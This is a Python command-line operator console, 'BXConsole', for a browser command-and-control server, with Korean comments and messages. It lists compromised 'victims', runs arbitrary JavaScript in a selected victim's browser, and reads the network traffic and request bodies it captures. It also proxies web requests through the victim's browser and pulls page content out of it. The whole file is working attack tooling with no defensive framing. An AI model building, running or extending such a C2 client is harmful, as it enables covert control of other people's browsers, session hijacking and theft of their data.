#!/usr/bin/env python3
"""BXConsole 운영자 CLI v0.2 — 터미널 REPL.

실행:  python3 c2/cli.py [C2_URL]
       python3 c2/cli.py http://127.0.0.1:7700

명령:
  ls / list           피해자 목록 갱신·출력
  sel <n>             번호로 피해자 선택
  <JS 코드>           선택 피해자에 전송, 결과 대기
  hist                명령 이력
  net [n]             네트워크 캡처 최근 n개 (기본 20)
  proxy <url>         브라우저 프록시 요청 (결과 대기)
  dom.q <selector>    querySelector 결과
  dom.text <sel>      텍스트 추출
  close               현재 피해자 세션 닫기
  ?  /  help          이 도움말
  q / quit            종료
"""
import sys, json, time, urllib.request, urllib.error, os

C2 = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:7700"
TIMEOUT = 5
WAIT_SECS = 15          # 명령 결과 최대 대기

# ── readline (있으면) ──
try:
    import readline
    HIST_FILE = os.path.expanduser("~/.bxconsole_history")
    try: readline.read_history_file(HIST_FILE)
    except FileNotFoundError: pass
    import atexit; atexit.register(readline.write_history_file, HIST_FILE)
except ImportError:
    pass

# ── HTTP 헬퍼 ──
def _get(path):
    with urllib.request.urlopen(C2 + path, timeout=TIMEOUT) as r:
        return json.loads(r.read())

def _post(path, data):
    body = json.dumps(data).encode()
    req  = urllib.request.Request(C2 + path, data=body,
                                  headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
        return json.loads(r.read())

# ── 피해자 목록 ──
def load_victims():
    d = _get("/api/state")
    closed = set(d.get("closed", []))
    vics   = {k: v for k, v in d.get("victims", {}).items() if k not in closed}
    names  = d.get("names", {})
    sse    = d.get("sse",   {})
    return sorted(vics.keys(), key=lambda k: vics[k].get("last",""), reverse=True), vics, names, sse, d

def show_victims(vlist, vics, names, sse):
    if not vlist:
        print("  (피해자 없음)")
        return
    for i, k in enumerate(vlist):
        v    = vics[k]
        name = names.get(k) or v.get("name") or k
        ch   = "SSE" if sse.get(k, 0) > 0 else "폴링"
        url  = v.get("url", "")[:60]
        print(f"  [{i}] {name}  |  {k}  |  {ch}  |  last={v.get('last','?')}  |  {url}")

# ── 명령 결과 대기 ──
def wait_result(cid_val, quiet=False):
    if not quiet:
        print(f"  ⏳ cid={cid_val}  대기 중 (최대 {WAIT_SECS}초)…", end="", flush=True)
    deadline = time.time() + WAIT_SECS
    while time.time() < deadline:
        time.sleep(0.5)
        try:
            d = _get("/api/state")
            c = next((x for x in d.get("commands", []) if x.get("cid") == cid_val), None)
        except Exception:
            continue
        if c and c["state"] == "DONE":
            if not quiet: print()
            out = c.get("out", "") or ""
            err = c.get("err", "")
            if err:
                print(f"\033[91m  ✖ {err[:300]}\033[0m")
            elif out in ("", "undefined"):
                print("  \033[2mundefined\033[0m")
            else:
                print(f"  \033[96m← {out[:600]}\033[0m")
            return True
    if not quiet: print(" (타임아웃)")
    return False

# ── send ──
def send(active, code, quiet=False):
    try:
        r = _post("/api/send", {"id": active, "cmd": code})
    except Exception as e:
        print(f"\033[91m  오류: {e}\033[0m")
        return
    if r.get("ok") is False:
        print(f"\033[91m  ✖ {r.get('error','전송 실패')}\033[0m")
        return
    wait_result(r.get("cid", ""), quiet=quiet)

# ── 메인 REPL ──
def main():
    print(f"\033[94mBXConsole CLI v0.2  →  {C2}\033[0m")
    print("  도움: ?  |  목록: ls  |  종료: q\n")

    active      = None
    vlist       = []
    vics = names = sse = {}

    while True:
        lbl = "?" if not active else active[:8]
        try:
            line = input(f"\033[90mbx[{lbl}]\033[0m \033[97m›\033[0m ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break

        if not line:
            continue

        if line in ("q", "quit", "exit"):
            break

        if line in ("?", "help"):
            print(__doc__)
            continue

        if line in ("ls", "list"):
            try:
                vlist, vics, names, sse, _ = load_victims()
                show_victims(vlist, vics, names, sse)
            except Exception as e:
                print(f"\033[91m  오류: {e}\033[0m")
            continue

        if line.startswith("sel "):
            try:
                n = int(line.split(None, 1)[1])
                if not vlist:
                    vlist, vics, names, sse, _ = load_victims()
                if 0 <= n < len(vlist):
                    active = vlist[n]
                    v = vics.get(active, {})
                    nm = names.get(active) or v.get("name") or active
                    print(f"  ✔ 선택: \033[96m{nm}\033[0m  ({active})")
                else:
                    print("  잘못된 번호 — ls 로 목록 확인")
            except (ValueError, IndexError):
                print("  사용법: sel <번호>")
            continue

        if line in ("hist",):
            if not active:
                print("  피해자를 먼저 선택하세요 (sel <n>)")
                continue
            try:
                d = _get("/api/state")
                mine = [c for c in d.get("commands", []) if c["vid"] == active]
                for c in mine[-20:]:
                    st  = c["state"]
                    out = (c.get("out") or c.get("err") or "")[:100]
                    col = "\033[93m" if st != "DONE" else ("\033[91m" if c.get("err") else "\033[0m")
                    print(f"  {col}[{c['t_queued']}] {st:<12}\033[0m {c['code'][:70]}")
                    if out:
                        print(f"          \033[2m{out}\033[0m")
            except Exception as e:
                print(f"\033[91m  오류: {e}\033[0m")
            continue

        if line.startswith("net"):
            if not active:
                print("  피해자를 먼저 선택하세요")
                continue
            parts = line.split(); n = int(parts[1]) if len(parts) > 1 else 20
            try:
                rows = _get(f"/api/net?id={active}")
                if not rows:
                    print("  (네트워크 캡처 없음)")
                else:
                    for r in rows[-n:]:
                        sc  = r.get("status", 0)
                        sc_col = "\033[92m" if 200 <= sc < 300 else ("\033[93m" if 300 <= sc < 400 else "\033[91m")
                        print(f"  {r['t']}  \033[97m{r['method']:<6}\033[0m {sc_col}{sc}\033[0m  {r['url'][:80]}  \033[2m{r.get('ms','')}ms\033[0m")
                        if r.get("body"):
                            print(f"           \033[2m{r['body'][:120]}\033[0m")
            except Exception as e:
                print(f"\033[91m  오류: {e}\033[0m")
            continue

        if line.startswith("proxy "):
            if not active:
                print("  피해자를 먼저 선택하세요")
                continue
            url = line[6:].strip()
            print(f"  → bx.proxy({url!r})")
            send(active, f"await bx.proxy({json.dumps(url)})")
            continue

        if line.startswith("dom.q "):
            sel = line[6:].strip()
            send(active, f"bx.dom.q({json.dumps(sel)})?.outerHTML || null")
            continue

        if line.startswith("dom.text "):
            sel = line[9:].strip()
            send(active, f"bx.dom.text({json.dumps(sel)})")
            continue

        if line == "close":
            if not active:
                print("  피해자를 먼저 선택하세요")
                continue
            try:
                r = _post("/api/close", {"id": active})
                print(f"  ✔ 닫힘  {active}")
                active = None
            except Exception as e:
                print(f"\033[91m  오류: {e}\033[0m")
            continue

        # ── 기본: JS 코드 전송 ──
        if not active:
            print("  피해자를 먼저 선택하세요 (ls → sel <n>)")
            continue
        send(active, line)

if __name__ == "__main__":
    main()
